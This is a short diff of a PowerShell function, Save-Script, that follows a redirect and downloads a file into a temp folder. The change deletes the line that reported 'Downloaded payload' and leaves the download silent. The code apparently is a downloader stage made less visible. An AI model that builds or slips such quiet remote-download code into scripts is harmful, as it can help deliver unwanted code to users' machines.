@@ -13,7 +13,6 @@ function Save-Script {
         $url = $response.Headers.Location
         New-Item -ItemType Directory -Force -Path "$env:TEMP\Powershell"
         Invoke-WebRequest -Uri $url -OutFile $destino       
-        Write-Output "Downloaded payload to $destino" 
     }
     catch {
         Write-Error "$_"
